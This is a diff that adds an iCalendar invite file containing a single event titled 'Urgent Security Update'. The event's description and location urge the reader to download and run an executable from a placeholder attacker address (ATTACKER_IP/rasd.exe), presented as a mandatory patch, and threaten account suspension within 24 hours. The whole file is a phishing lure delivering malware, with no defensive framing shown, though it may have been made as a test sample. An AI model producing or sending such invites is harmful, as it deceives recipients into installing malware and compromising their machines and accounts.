@@ -1,0 +1,13 @@
+BEGIN:VCALENDAR
+VERSION:2.0
+PRODID:-//hacksw/handcal//NONSGML v1.0//EN
+BEGIN:VEVENT
+UID:20250606T120000Z-123456@example.com
+DTSTAMP:20250606T120000Z
+DTSTART:20250606T130000Z
+DTEND:20250606T133000Z
+SUMMARY:Urgent Security Update
+DESCRIPTION:Please click this link to install the mandatory security patch:\n\nhttp://ATTACKER_IP/rasd.exe\n\nFailure to update within 24 hours will result in account suspension.
+LOCATION:http://ATTACKER_IP/rasd.exe
+END:VEVENT
+END:VCALENDAR
